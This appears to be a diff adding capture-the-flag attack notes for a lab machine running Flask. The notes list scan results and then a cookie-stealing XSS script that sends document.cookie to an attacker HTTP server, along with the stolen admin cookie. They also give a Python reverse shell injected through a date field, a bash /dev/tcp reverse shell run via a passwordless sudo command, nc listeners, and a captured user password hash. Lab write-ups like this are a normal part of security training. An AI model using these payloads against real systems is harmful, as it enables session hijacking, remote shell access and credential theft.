@@ -1,0 +1,34 @@
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs => "user"
+
+--- Directories found on server ---
++ /
++ http://10.10.11.8:5000/dashboard (CODE:500|SIZE:265)                                                                      
++ http://10.10.11.8:5000/support (CODE:200|SIZE:2363)
+
+
+--- Web Technologies ---
+flask 2.2.2
+python 3.11.2
+
+--- NMAP SCAN ---
+Nmap scan report for 10.10.11.8
+Host is up (0.064s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+5000/tcp open  upnp?
+
+--- place in 'user agent & message' block ---
+SCRIPT=> <script>var i=new Image(); i.src="http://10.10.14.154:8001/?cookie="+btoa(document.cookie);</script>
+PYSERVER COMMAND => `python -m http.server 8001`
+STOLEN COOKIE: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 
+
+--- via burpsuite, add `;` to end of date and add reverse shell ---
+REVSHELL => export RHOST="10.10.14.104";export RPORT=2357;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+LISTENER => nc -lvnp 2357
+
+--- `sudo -l` reveals that `syscheck` is executable command with no password ---
+REVSHELL VIA `sudo syscheck` COMMAND => sh -i >& /dev/tcp/10.10.14.104/6969 0>&1
+LISTENER => nc -lvnp 6969
+USER HASH =>  $y$j9T$IKU310jZ./br3hMhSpYSH0$IbCr4LIWNnOd76D2ObQYiNOCmGX4ZI7DTnKjbs8gXe9
+
